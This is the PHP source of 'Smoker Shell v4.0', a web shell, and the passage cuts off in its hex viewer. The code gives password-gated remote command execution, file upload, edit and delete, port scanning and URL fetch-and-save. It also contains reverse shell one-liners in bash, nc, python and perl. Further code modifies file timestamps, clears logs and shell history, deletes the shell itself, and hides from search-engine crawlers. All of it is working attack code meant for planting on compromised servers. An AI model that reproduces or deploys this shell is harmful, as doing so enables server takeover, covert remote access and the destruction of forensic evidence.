<?php
/*
 * Smoker Shell v4.0
 * Advanced Penetration Testing Interface
 */
error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('log_errors', 0);
@clearstatcache();

// ======================== CONFIGURATION ========================
$CONF = [
    'passwd' => 'admin',
    'title'  => 'Smoker Shell v4.0',
];

// ======================== CORE UTILITIES ========================

function fmt_bytes($b, $p = 2) {
    $u = ['B','KB','MB','GB','TB'];
    $b = max($b, 0);
    $pow = floor(($b ? log($b) : 0) / log(1024));
    $pow = min($pow, count($u) - 1);
    return round($b / pow(1024, $pow), $p) . ' ' . $u[$pow];
}

function fmt_perms($file) {
    $p = fileperms($file);
    $s  = (($p & 0x0100) ? 'r' : '-');
    $s .= (($p & 0x0080) ? 'w' : '-');
    $s .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));
    $s .= (($p & 0x0020) ? 'r' : '-');
    $s .= (($p & 0x0010) ? 'w' : '-');
    $s .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));
    $s .= (($p & 0x0004) ? 'r' : '-');
    $s .= (($p & 0x0002) ? 'w' : '-');
    $s .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));
    return $s;
}

function fmt_octal($file) {
    return substr(sprintf('%o', fileperms($file)), -4);
}

function run_cmd($cmd) {
    $out = '';
    if (function_exists('exec')) {
        @exec($cmd . ' 2>&1', $arr);
        $out = implode("\n", $arr);
    } elseif (function_exists('shell_exec')) {
        $out = @shell_exec($cmd . ' 2>&1');
    } elseif (function_exists('system')) {
        ob_start();
        @system($cmd . ' 2>&1');
        $out = ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        @passthru($cmd . ' 2>&1');
        $out = ob_get_clean();
    } elseif (function_exists('popen')) {
        $h = @popen($cmd . ' 2>&1', 'r');
        if ($h) { while (!feof($h)) $out .= fread($h, 4096); pclose($h); }
    } elseif (function_exists('proc_open')) {
        $desc = [0 => ['pipe','r'], 1 => ['pipe','w'], 2 => ['pipe','w']];
        $proc = @proc_open($cmd, $desc, $pipes);
        if (is_resource($proc)) {
            $out = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
            fclose($pipes[1]); fclose($pipes[2]);
            proc_close($proc);
        }
    }
    return $out;
}

function get_cwd() {
    if (isset($_GET['d']) && is_dir($_GET['d'])) return realpath($_GET['d']);
    return str_replace('\\', '/', getcwd());
}

function build_breadcrumbs($path) {
    $parts = explode('/', trim($path, '/'));
    $html = '<a href="?p=files&d=/">/</a>';
    $trail = '';
    foreach ($parts as $part) {
        if ($part === '') continue;
        $trail .= '/' . $part;
        $html .= ' <a href="?p=files&d=' . urlencode($trail) . '">' . htmlspecialchars($part) . '</a> /';
    }
    return $html;
}

function get_exec_methods() {
    $methods = ['exec','shell_exec','system','passthru','popen','proc_open'];
    $available = [];
    foreach ($methods as $m) {
        if (function_exists($m)) $available[] = $m;
    }
    return $available;
}

// ======================== SESSION & AUTH ========================
session_start();

$bots = '/Google|WhatsApp|Telegram|bing|Bing|yahoo|Yahoo|MSNBot|Slurp|PycURL|facebook|ia_archiver|crawler|Yandex|Bot|Spider/i';
if (preg_match($bots, $_SERVER['HTTP_USER_AGENT'] ?? '')) {
    header('HTTP/1.0 404 Not Found');
    die('<h1>Not Found</h1>');
}

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ?');
    exit;
}

if (isset($_POST['login_pass'])) {
    if ($_POST['login_pass'] === $CONF['passwd']) {
        $_SESSION['authed'] = true;
        header('Location: ?');
        exit;
    }
    $login_error = true;
}

if (empty($_SESSION['authed'])) {
    // ---- LOGIN PAGE ----
    ?><!DOCTYPE html>
<html lang="en"><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title><?= $CONF['title'] ?></title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0c0a10;color:#c0c8d8;font-family:'Courier New',monospace;min-height:100vh;display:flex;align-items:center;justify-content:center;
background-image:radial-gradient(ellipse at 20% 50%,rgba(255,0,51,.06) 0%,transparent 50%),radial-gradient(ellipse at 80% 20%,rgba(167,139,250,.04) 0%,transparent 50%)}
.login-box{background:#141018;border:1px solid #251c2e;border-radius:12px;padding:48px 40px;width:380px;text-align:center;box-shadow:0 0 60px rgba(255,0,51,.08)}
.login-box h1{color:#ff0033;font-size:22px;margin-bottom:6px;letter-spacing:2px}
.login-box .sub{color:#64748b;font-size:12px;margin-bottom:32px}
.login-box input[type=password]{width:100%;background:#0c0a10;border:1px solid #251c2e;color:#e2e8f0;padding:12px 16px;border-radius:8px;font-family:inherit;font-size:14px;margin-bottom:16px;outline:none;transition:border .2s}
.login-box input[type=password]:focus{border-color:#ff0033;box-shadow:0 0 12px rgba(255,0,51,.15)}
.login-box button{width:100%;background:#ff0033;color:#0c0a10;border:none;padding:12px;border-radius:8px;font-family:inherit;font-size:14px;font-weight:bold;cursor:pointer;transition:all .2s}
.login-box button:hover{background:#cc0029;box-shadow:0 0 20px rgba(255,0,51,.3)}
.err{color:#ef4444;font-size:12px;margin-bottom:12px}
</style></head><body>
<div class="login-box">
<h1>⬡ SMOKER SHELL</h1>
<div class="sub">v4.0 — Advanced Penetration Testing Interface</div>
<?php if (!empty($login_error)) echo '<div class="err">Invalid credentials</div>'; ?>
<form method="post">
<input type="password" name="login_pass" placeholder="Enter password" autofocus>
<button type="submit">AUTHENTICATE</button>
</form>
<div style="margin-top:28px;color:#64748b;font-size:11px;line-height:1.6;border-top:1px solid #251c2e;padding-top:16px"><span style="color:#ff0033">Legendary Hacker</span> was here, if you are here, You already know who i am!</div>
</div></body></html><?php
    die();
}

// ======================== AUTHENTICATED ZONE ========================
$page = $_GET['p'] ?? 'dashboard';
$dir  = get_cwd();
$msg  = '';
$msg_type = '';

// ---- HANDLE POST ACTIONS ----
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    // Terminal command
    if (isset($_POST['cmd']) && $_POST['cmd'] !== '') {
        $_SESSION['cmd_history'] = $_SESSION['cmd_history'] ?? [];
        array_unshift($_SESSION['cmd_history'], $_POST['cmd']);
        $_SESSION['cmd_history'] = array_slice($_SESSION['cmd_history'], 0, 50);
        $_SESSION['cmd_output'] = run_cmd('cd ' . escapeshellarg($dir) . ' && ' . $_POST['cmd']);
    }

    // File upload
    if (isset($_FILES['upload']) && $_FILES['upload']['error'] === 0) {
        $dest = $dir . '/' . basename($_FILES['upload']['name']);
        if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest)) {
            $msg = 'Uploaded: ' . basename($dest); $msg_type = 'ok';
        } else { $msg = 'Upload failed'; $msg_type = 'err'; }
    }

    // Edit file save
    if (isset($_POST['edit_content']) && isset($_POST['edit_path'])) {
        if (@file_put_contents($_POST['edit_path'], $_POST['edit_content']) !== false) {
            $msg = 'File saved'; $msg_type = 'ok';
        } else { $msg = 'Save failed'; $msg_type = 'err'; }
    }

    // Create file or directory
    if (isset($_POST['create_name']) && $_POST['create_name'] !== '') {
        $target = $dir . '/' . $_POST['create_name'];
        if ($_POST['create_type'] === 'dir') {
            if (@mkdir($target, 0755)) { $msg = 'Directory created'; $msg_type = 'ok'; }
            else { $msg = 'Failed to create directory'; $msg_type = 'err'; }
        } else {
            if (@file_put_contents($target, '') !== false) { $msg = 'File created'; $msg_type = 'ok'; }
            else { $msg = 'Failed to create file'; $msg_type = 'err'; }
        }
    }

    // Chmod
    if (isset($_POST['chmod_file']) && isset($_POST['chmod_val'])) {
        if (@chmod($_POST['chmod_file'], octdec($_POST['chmod_val']))) {
            $msg = 'Permissions changed'; $msg_type = 'ok';
        } else { $msg = 'chmod failed'; $msg_type = 'err'; }
    }

    // Rename
    if (isset($_POST['rename_from']) && isset($_POST['rename_to'])) {
        if (@rename($_POST['rename_from'], $_POST['rename_to'])) {
            $msg = 'Renamed successfully'; $msg_type = 'ok';
        } else { $msg = 'Rename failed'; $msg_type = 'err'; }
    }

    // Database query
    if (isset($_POST['db_query']) && isset($_POST['db_type'])) {
        $_SESSION['db_result'] = null;
        $_SESSION['db_error'] = null;
        $_SESSION['db_query_text'] = $_POST['db_query'];

        if ($_POST['db_type'] === 'mysql' && function_exists('mysqli_connect')) {
            $conn = @mysqli_connect($_POST['db_host'] ?? 'localhost', $_POST['db_user'] ?? 'root', $_POST['db_pass'] ?? '', $_POST['db_name'] ?? '', (int)($_POST['db_port'] ?? 3306));
            if ($conn) {
                $res = @mysqli_query($conn, $_POST['db_query']);
                if ($res === true) {
                    $_SESSION['db_result'] = [['Affected Rows' => mysqli_affected_rows($conn)]];
                } elseif ($res) {
                    $rows = [];
                    while ($row = mysqli_fetch_assoc($res)) $rows[] = $row;
                    $_SESSION['db_result'] = $rows;
                } else {
                    $_SESSION['db_error'] = mysqli_error($conn);
                }
                mysqli_close($conn);
            } else {
                $_SESSION['db_error'] = 'Connection failed: ' . mysqli_connect_error();
            }
        } elseif ($_POST['db_type'] === 'sqlite' && class_exists('SQLite3')) {
            try {
                $db = new SQLite3($_POST['db_file']);
                $res = $db->query($_POST['db_query']);
                $rows = [];
                if ($res) { while ($row = $res->fetchArray(SQLITE3_ASSOC)) $rows[] = $row; }
                $_SESSION['db_result'] = $rows;
                $db->close();
            } catch (Exception $e) {
                $_SESSION['db_error'] = $e->getMessage();
            }
        }
    }

    // Port scan
    if (isset($_POST['scan_host']) && isset($_POST['scan_ports'])) {
        $host = $_POST['scan_host'];
        $ports_raw = $_POST['scan_ports'];
        $timeout = (float)($_POST['scan_timeout'] ?? 1);
        $results = [];
        $port_list = [];

        if (strpos($ports_raw, '-') !== false) {
            list($start, $end) = explode('-', $ports_raw, 2);
            $port_list = range((int)$start, min((int)$end, (int)$start + 1024));
        } else {
            $port_list = array_map('intval', explode(',', $ports_raw));
        }

        foreach ($port_list as $port) {
            $fp = @fsockopen($host, $port, $errno, $errstr, $timeout);
            if ($fp) {
                $results[$port] = 'open';
                fclose($fp);
            } else {
                $results[$port] = 'closed';
            }
        }
        $_SESSION['scan_results'] = $results;
        $_SESSION['scan_host'] = $host;
    }

    // Fetch URL
    if (isset($_POST['fetch_url']) && $_POST['fetch_url'] !== '') {
        $url = $_POST['fetch_url'];
        $save_as = $_POST['fetch_saveas'] ?? basename(parse_url($url, PHP_URL_PATH));
        if (!$save_as) $save_as = 'downloaded_file';
        $dest = $dir . '/' . $save_as;
        $content = @file_get_contents($url);
        if ($content !== false && @file_put_contents($dest, $content) !== false) {
            $msg = 'Downloaded to: ' . $dest; $msg_type = 'ok';
        } else { $msg = 'Download failed'; $msg_type = 'err'; }
    }

    // Back connect
    if (isset($_POST['bc_ip']) && isset($_POST['bc_port']) && isset($_POST['bc_method'])) {
        $ip = $_POST['bc_ip'];
        $port = (int)$_POST['bc_port'];
        $method = $_POST['bc_method'];
        if ($method === 'php') {
            $sock = @fsockopen($ip, $port, $errno, $errstr, 10);
            if ($sock) {
                $desc = [0 => $sock, 1 => $sock, 2 => $sock];
                $proc = @proc_open('/bin/sh', $desc, $pipes);
                if (is_resource($proc)) { $msg = 'Reverse shell spawned'; $msg_type = 'ok'; }
                else { $msg = 'proc_open failed'; $msg_type = 'err'; }
            } else { $msg = "Connect failed: $errstr ($errno)"; $msg_type = 'err'; }
        } else {
            $cmds = [
                'bash'    => "bash -i >& /dev/tcp/$ip/$port 0>&1",
                'nc'      => "nc -e /bin/sh $ip $port",
                'python'  => "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
                'perl'    => "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")'",
            ];
            if (isset($cmds[$method])) {
                run_cmd($cmds[$method] . ' &');
                $msg = 'Reverse shell command executed'; $msg_type = 'ok';
            }
        }
    }

    // Timestomp
    if (isset($_POST['ts_file']) && isset($_POST['ts_time'])) {
        $ts = strtotime($_POST['ts_time']);
        if ($ts && @touch($_POST['ts_file'], $ts, $ts)) {
            $msg = 'Timestamps modified'; $msg_type = 'ok';
        } else { $msg = 'Timestomp failed'; $msg_type = 'err'; }
    }

    // Self destruct
    if (isset($_POST['self_destruct']) && $_POST['self_destruct'] === 'CONFIRM') {
        @unlink(__FILE__);
        session_destroy();
        die('<html><body style="background:#0c0a10;color:#ef4444;display:flex;align-items:center;justify-content:center;height:100vh;font-family:monospace"><h1>Shell destroyed.</h1></body></html>');
    }

    // Clear logs
    if (isset($_POST['clear_log'])) {
        $log = $_POST['clear_log'];
        if (is_writable($log)) {
            @file_put_contents($log, '');
            $msg = 'Log cleared: ' . $log; $msg_type = 'ok';
        } else {
            $result = run_cmd('echo -n "" > ' . escapeshellarg($log) . ' 2>&1');
            $msg = $result ? 'Clear attempt: ' . $result : 'Log cleared via shell'; $msg_type = 'ok';
        }
    }

    // Clear bash history
    if (isset($_POST['clear_history'])) {
        $home = $_SERVER['HOME'] ?? run_cmd('echo $HOME');
        $files = ['.bash_history', '.zsh_history', '.sh_history', '.history'];
        $cleared = [];
        foreach ($files as $f) {
            $path = trim($home) . '/' . $f;
            if (file_exists($path)) {
                @file_put_contents($path, '');
                $cleared[] = $f;
            }
        }
        run_cmd('history -c 2>/dev/null; unset HISTFILE 2>/dev/null');
        $msg = 'Cleared: ' . ($cleared ? implode(', ', $cleared) : 'no history files found'); $msg_type = 'ok';
    }
}

// ---- HANDLE GET ACTIONS ----
if (isset($_GET['dl']) && is_file($_GET['dl'])) {
    $file = $_GET['dl'];
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}

if (isset($_GET['delete']) && isset($_GET['file'])) {
    if ($_GET['delete'] === 'file' && @unlink($_GET['file'])) {
        $msg = 'File deleted'; $msg_type = 'ok';
    } elseif ($_GET['delete'] === 'dir' && @rmdir($_GET['file'])) {
        $msg = 'Directory removed'; $msg_type = 'ok';
    } else { $msg = 'Delete failed'; $msg_type = 'err'; }
}

// ======================== GATHER PAGE DATA ========================
$sys_info = [
    'os'       => php_uname(),
    'hostname' => php_uname('n'),
    'kernel'   => php_uname('r'),
    'arch'     => php_uname('m'),
    'php'      => phpversion(),
    'sapi'     => php_sapi_name(),
    'user'     => get_current_user(),
    'uid'      => function_exists('posix_getuid') ? posix_getuid() : 'N/A',
    'gid'      => function_exists('posix_getgid') ? posix_getgid() : 'N/A',
    'cwd'      => $dir,
    'server'   => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
    'docroot'  => $_SERVER['DOCUMENT_ROOT'] ?? 'Unknown',
    'disk_free'  => function_exists('disk_free_space') ? fmt_bytes(@disk_free_space('/')) : 'N/A',
    'disk_total' => function_exists('disk_total_space') ? fmt_bytes(@disk_total_space('/')) : 'N/A',
    'disabled'   => ini_get('disable_functions') ?: 'None',
    'open_basedir' => ini_get('open_basedir') ?: 'None',
    'safe_mode'    => ini_get('safe_mode') ? 'On' : 'Off',
    'exec_methods' => get_exec_methods(),
];

$nav_items = [
    'dashboard' => ['icon' => '◈', 'label' => 'Dashboard'],
    'files'     => ['icon' => '▤', 'label' => 'File Manager'],
    'terminal'  => ['icon' => '⬡', 'label' => 'Terminal'],
    'recon'     => ['icon' => '◎', 'label' => 'System Recon'],
    'network'   => ['icon' => '⬢', 'label' => 'Network Tools'],
    'database'  => ['icon' => '⊞', 'label' => 'Database'],
    'privesc'   => ['icon' => '⬆', 'label' => 'Priv-Esc'],
    'encoding'  => ['icon' => '⟐', 'label' => 'Encoding'],
    'stealth'   => ['icon' => '⊘', 'label' => 'Stealth'],
];

// ======================== HTML OUTPUT ========================
?><!DOCTYPE html>
<html lang="en"><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title><?= $CONF['title'] ?> — <?= $nav_items[$page]['label'] ?? 'Shell' ?></title>
<style>
:root{
    --bg:#0c0a10;--bg2:#141018;--bg3:#1c1525;--border:#251c2e;
    --accent:#ff0033;--cyan:#a78bfa;--red:#ef4444;--yellow:#f59e0b;--blue:#3b82f6;
    --text:#c0c8d8;--text2:#64748b;--text3:#94a3b8;
}
*{margin:0;padding:0;box-sizing:border-box}
body{background:var(--bg);color:var(--text);font-family:'Courier New','Fira Code',monospace;font-size:13px;display:flex;min-height:100vh;
background-image:radial-gradient(ellipse at 10% 90%,rgba(255,0,51,.03) 0%,transparent 50%),radial-gradient(ellipse at 90% 10%,rgba(167,139,250,.03) 0%,transparent 50%)}
a{color:#c084fc;text-decoration:none}
a:hover{color:var(--accent)}

/* Sidebar */
.sidebar{width:220px;background:var(--bg2);border-right:1px solid var(--border);display:flex;flex-direction:column;position:fixed;height:100vh;z-index:10}
.sidebar .brand{padding:20px 16px;border-bottom:1px solid var(--border);text-align:center}
.sidebar .brand h2{color:var(--accent);font-size:14px;letter-spacing:3px}
.sidebar .brand .ver{color:var(--text2);font-size:10px;margin-top:4px}
.sidebar nav{flex:1;overflow-y:auto;padding:8px 0}
.sidebar nav a{display:flex;align-items:center;gap:10px;padding:10px 20px;color:var(--text3);transition:all .15s;border-left:3px solid transparent;font-size:12px}
.sidebar nav a:hover{background:rgba(255,0,51,.05);color:var(--accent);border-left-color:var(--accent)}
.sidebar nav a.active{background:rgba(255,0,51,.08);color:var(--accent);border-left-color:var(--accent)}
.sidebar nav a .icon{font-size:16px;width:20px;text-align:center}
.sidebar .sidebar-footer{padding:12px 16px;border-top:1px solid var(--border);font-size:10px;color:var(--text2)}
.sidebar .sidebar-footer a{color:var(--red);font-size:10px}

/* Main */
.main{margin-left:220px;flex:1;min-height:100vh;display:flex;flex-direction:column}
.topbar{background:var(--bg2);border-bottom:1px solid var(--border);padding:12px 24px;display:flex;align-items:center;gap:16px;font-size:11px;color:var(--text2);flex-wrap:wrap}
.topbar .tag{background:var(--bg);border:1px solid var(--border);padding:2px 8px;border-radius:4px;color:var(--text3)}
.topbar .tag b{color:var(--accent)}
.content{flex:1;padding:24px}

/* Cards & Panels */
.grid{display:grid;gap:16px}
.grid-2{grid-template-columns:repeat(auto-fit,minmax(300px,1fr))}
.grid-3{grid-template-columns:repeat(auto-fit,minmax(250px,1fr))}
.grid-4{grid-template-columns:repeat(auto-fit,minmax(200px,1fr))}
.card{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:20px}
.card h3{color:var(--accent);font-size:12px;letter-spacing:1px;margin-bottom:12px;text-transform:uppercase}
.card .val{font-size:20px;color:#fff;font-weight:bold}
.card .label{font-size:11px;color:var(--text2);margin-top:4px}
.panel{background:var(--bg2);border:1px solid var(--border);border-radius:8px;margin-bottom:16px}
.panel-head{padding:14px 20px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between}
.panel-head h3{color:var(--accent);font-size:12px;letter-spacing:1px;text-transform:uppercase}
.panel-body{padding:20px}

/* Table */
table.tbl{width:100%;border-collapse:collapse;font-size:12px}
table.tbl th{background:var(--bg);color:var(--accent);padding:8px 12px;text-align:left;font-size:11px;letter-spacing:.5px;text-transform:uppercase;border-bottom:1px solid var(--border)}
table.tbl td{padding:8px 12px;border-bottom:1px solid rgba(30,41,59,.5);color:var(--text)}
table.tbl tr:hover td{background:rgba(255,0,51,.03)}
table.tbl .open{color:var(--accent)}
table.tbl .closed{color:var(--text2)}

/* Forms */
input[type=text],input[type=password],input[type=number],select,textarea{
    background:var(--bg);border:1px solid var(--border);color:var(--text);padding:8px 12px;border-radius:6px;font-family:inherit;font-size:12px;outline:none;transition:border .2s}
input:focus,textarea:focus,select:focus{border-color:var(--accent);box-shadow:0 0 8px rgba(255,0,51,.15)}
textarea{width:100%;resize:vertical;min-height:120px}
.btn{display:inline-block;padding:8px 16px;border:1px solid var(--border);background:var(--bg);color:var(--text);border-radius:6px;cursor:pointer;font-family:inherit;font-size:12px;transition:all .15s}
.btn:hover{border-color:var(--accent);color:var(--accent);box-shadow:0 0 10px rgba(255,0,51,.1)}
.btn-green{background:var(--accent);color:var(--bg);border-color:var(--accent);font-weight:bold}
.btn-green:hover{background:#cc0029;box-shadow:0 0 16px rgba(255,0,51,.3)}
.btn-red{border-color:var(--red);color:var(--red)}
.btn-red:hover{background:var(--red);color:#fff;box-shadow:0 0 12px rgba(239,68,68,.3)}
.btn-sm{padding:4px 10px;font-size:11px}
.form-row{display:flex;gap:8px;align-items:center;margin-bottom:12px;flex-wrap:wrap}
.form-row label{min-width:80px;color:var(--text2);font-size:11px}

/* Terminal */
.terminal{background:#000;border:1px solid var(--border);border-radius:8px;font-family:'Courier New',monospace;overflow:hidden}
.terminal-head{background:var(--bg2);padding:8px 14px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:6px}
.terminal-head .dot{width:10px;height:10px;border-radius:50%}
.terminal-body{padding:16px;max-height:500px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;font-size:12px;color:#ff3355;line-height:1.6}
.terminal-input{display:flex;border-top:1px solid var(--border);background:#0a0a0a}
.terminal-input span{padding:10px 0 10px 14px;color:var(--accent);font-weight:bold;white-space:nowrap}
.terminal-input input{flex:1;background:transparent;border:none;color:var(--text);padding:10px;font-family:inherit;font-size:13px;outline:none}

/* Tabs */
.tabs{display:flex;gap:0;border-bottom:1px solid var(--border);margin-bottom:16px}
.tab{padding:10px 20px;color:var(--text2);cursor:pointer;border-bottom:2px solid transparent;font-size:12px;transition:all .15s}
.tab:hover{color:var(--text)}
.tab.active{color:var(--accent);border-bottom-color:var(--accent)}
.tab-content{display:none}
.tab-content.active{display:block}

/* Status */
.msg{padding:10px 16px;border-radius:6px;margin-bottom:16px;font-size:12px}
.msg-ok{background:rgba(255,0,51,.1);border:1px solid rgba(255,0,51,.2);color:var(--accent)}
.msg-err{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.2);color:var(--red)}

/* Badges */
.badge{display:inline-block;padding:2px 8px;border-radius:4px;font-size:10px;font-weight:bold}
.badge-green{background:rgba(255,0,51,.15);color:#ff3355}
.badge-red{background:rgba(239,68,68,.15);color:var(--red)}
.badge-yellow{background:rgba(245,158,11,.15);color:var(--yellow)}
.badge-blue{background:rgba(59,130,246,.15);color:var(--blue)}
.badge-cyan{background:rgba(167,139,250,.15);color:var(--cyan)}

/* Hex viewer */
.hex-view{font-family:'Courier New',monospace;font-size:11px;line-height:1.8;background:#000;padding:16px;border-radius:6px;overflow-x:auto;color:var(--text2)}
.hex-view .offset{color:#a78bfa}
.hex-view .byte{color:var(--text)}
.hex-view .ascii{color:#ff3355}

/* Scrollbar */
::-webkit-scrollbar{width:6px;height:6px}
::-webkit-scrollbar-track{background:var(--bg)}
::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
::-webkit-scrollbar-thumb:hover{background:#3a2545}

/* Responsive */
@media(max-width:768px){.sidebar{width:60px}.sidebar .brand h2,.sidebar nav a span,.sidebar .sidebar-footer{display:none}.sidebar nav a{justify-content:center;padding:14px}.main{margin-left:60px}}
</style>
</head><body>

<!-- SIDEBAR -->
<div class="sidebar">
    <div class="brand">
        <h2>◈ SMOKER</h2>
        <div class="ver">SHELL v4.0</div>
    </div>
    <nav>
        <?php foreach ($nav_items as $key => $item): ?>
        <a href="?p=<?= $key ?><?= $key === 'files' ? '&d=' . urlencode($dir) : '' ?>" class="<?= $page === $key ? 'active' : '' ?>">
            <span class="icon"><?= $item['icon'] ?></span>
            <span><?= $item['label'] ?></span>
        </a>
        <?php endforeach; ?>
    </nav>
    <div class="sidebar-footer">
        <?= $sys_info['user'] ?>@<?= $sys_info['hostname'] ?><br>
        <a href="?logout=true">[ Logout ]</a>
    </div>
</div>

<!-- MAIN -->
<div class="main">
<div class="topbar">
    <span class="tag"><b>OS</b> <?= php_uname('s') . ' ' . php_uname('m') ?></span>
    <span class="tag"><b>PHP</b> <?= $sys_info['php'] ?></span>
    <span class="tag"><b>User</b> <?= $sys_info['user'] ?></span>
    <span class="tag"><b>Disk</b> <?= $sys_info['disk_free'] ?> free</span>
    <span class="tag"><b>Exec</b> <?= count($sys_info['exec_methods']) ?> methods</span>
</div>

<div class="content">

<?php if ($msg): ?>
<div class="msg msg-<?= $msg_type ?>"><?= htmlspecialchars($msg) ?></div>
<?php endif; ?>

<?php
// ============================================================
//  DASHBOARD
// ============================================================
if ($page === 'dashboard'): ?>

<div class="grid grid-4" style="margin-bottom:20px">
    <div class="card"><div class="val"><?= php_uname('s') ?></div><div class="label">Operating System</div></div>
    <div class="card"><div class="val"><?= $sys_info['php'] ?></div><div class="label">PHP Version</div></div>
    <div class="card"><div class="val"><?= $sys_info['disk_free'] ?></div><div class="label">Free Disk Space</div></div>
    <div class="card"><div class="val"><?= count($sys_info['exec_methods']) ?></div><div class="label">Exec Methods</div></div>
</div>

<div class="grid grid-2">
    <div class="panel">
        <div class="panel-head"><h3>Server Info</h3></div>
        <div class="panel-body">
            <table class="tbl">
                <tr><td style="color:var(--text2);width:140px">Hostname</td><td><?= htmlspecialchars($sys_info['hostname']) ?></td></tr>
                <tr><td style="color:var(--text2)">Kernel</td><td><?= htmlspecialchars($sys_info['kernel']) ?></td></tr>
                <tr><td style="color:var(--text2)">Architecture</td><td><?= htmlspecialchars($sys_info['arch']) ?></td></tr>
                <tr><td style="color:var(--text2)">Server Software</td><td><?= htmlspecialchars($sys_info['server']) ?></td></tr>
                <tr><td style="color:var(--text2)">Document Root</td><td><?= htmlspecialchars($sys_info['docroot']) ?></td></tr>
                <tr><td style="color:var(--text2)">Current Directory</td><td style="word-break:break-all"><?= htmlspecialchars($sys_info['cwd']) ?></td></tr>
                <tr><td style="color:var(--text2)">User / UID:GID</td><td><?= $sys_info['user'] ?> / <?= $sys_info['uid'] ?>:<?= $sys_info['gid'] ?></td></tr>
                <tr><td style="color:var(--text2)">SAPI</td><td><?= $sys_info['sapi'] ?></td></tr>
                <tr><td style="color:var(--text2)">Disk Total</td><td><?= $sys_info['disk_total'] ?></td></tr>
            </table>
        </div>
    </div>
    <div class="panel">
        <div class="panel-head"><h3>PHP Configuration</h3></div>
        <div class="panel-body">
            <table class="tbl">
                <tr><td style="color:var(--text2);width:140px">Safe Mode</td><td><span class="badge <?= $sys_info['safe_mode'] === 'Off' ? 'badge-green' : 'badge-red' ?>"><?= $sys_info['safe_mode'] ?></span></td></tr>
                <tr><td style="color:var(--text2)">Open Basedir</td><td><span class="badge <?= $sys_info['open_basedir'] === 'None' ? 'badge-green' : 'badge-yellow' ?>"><?= htmlspecialchars($sys_info['open_basedir']) ?></span></td></tr>
                <tr><td style="color:var(--text2)">Exec Methods</td><td><?php foreach($sys_info['exec_methods'] as $m) echo '<span class="badge badge-green" style="margin:2px">'.$m.'</span> '; if(!$sys_info['exec_methods']) echo '<span class="badge badge-red">None</span>'; ?></td></tr>
                <tr><td style="color:var(--text2)">Disabled Functions</td><td style="word-break:break-all;font-size:10px;max-width:300px"><?= htmlspecialchars($sys_info['disabled'] === 'None' ? 'None' : substr($sys_info['disabled'], 0, 500)) ?></td></tr>
                <tr><td style="color:var(--text2)">Max Execution</td><td><?= ini_get('max_execution_time') ?>s</td></tr>
                <tr><td style="color:var(--text2)">Memory Limit</td><td><?= ini_get('memory_limit') ?></td></tr>
                <tr><td style="color:var(--text2)">Upload Max</td><td><?= ini_get('upload_max_filesize') ?></td></tr>
                <tr><td style="color:var(--text2)">POST Max</td><td><?= ini_get('post_max_size') ?></td></tr>
                <tr><td style="color:var(--text2)">Extensions</td><td><?= count(get_loaded_extensions()) ?> loaded</td></tr>
            </table>
        </div>
    </div>
</div>

<?php
// ============================================================
//  FILE MANAGER
// ============================================================
elseif ($page === 'files'):
    $editing = isset($_GET['edit']) && is_file($_GET['edit']);
    $hexview = isset($_GET['hex']) && is_file($_GET['hex']);
    $viewing = isset($_GET['view']) && is_file($_GET['view']);
?>

<div class="panel">
    <div class="panel-head">
        <h3>📁 <?= build_breadcrumbs($dir) ?></h3>
        <div style="display:flex;gap:6px">
            <form method="post" enctype="multipart/form-data" style="display:flex;gap:6px;align-items:center">
                <input type="file" name="upload" style="font-size:11px;max-width:200px">
                <button class="btn btn-sm" type="submit">Upload</button>
            </form>
        </div>
    </div>
    <div class="panel-body">

    <?php if ($editing): $ef = $_GET['edit']; ?>
        <form method="post">
            <div style="margin-bottom:10px;color:var(--cyan);font-size:11px">Editing: <?= htmlspecialchars($ef) ?></div>
            <input type="hidden" name="edit_path" value="<?= htmlspecialchars($ef) ?>">
            <textarea name="edit_content" style="height:350px;font-size:12px;line-height:1.5"><?= htmlspecialchars(@file_get_contents($ef)) ?></textarea>
            <div style="margin-top:10px;display:flex;gap:8px">
                <button class="btn btn-green" type="submit">Save File</button>
                <a class="btn" href="?p=files&d=<?= urlencode($dir) ?>">Cancel</a>
            </div>
        </form>

    <?php elseif ($hexview): $hf = $_GET['hex']; $hdata = @file_get_contents($hf, false, null, 0, 4096); ?>
        <div style="margin-bottom:10px;color:var(--cyan);font-size:11px">Hex View: <?= htmlspecialchars($hf) ?> (first 4KB)</div>
        <div class="hex-view"><?php
            $len = strlen($hdata);
            for ($i = 0; $i < $len; $i += 16) {
                $hex = ''; $ascii = '';
                for ($j = 0; $j < 16; $j++) {
                    if ($i + $j < $len) {
                        $byte = ord($hdata[$i+$j]);
                        $hex .= sprintf('%02x ', $byte);
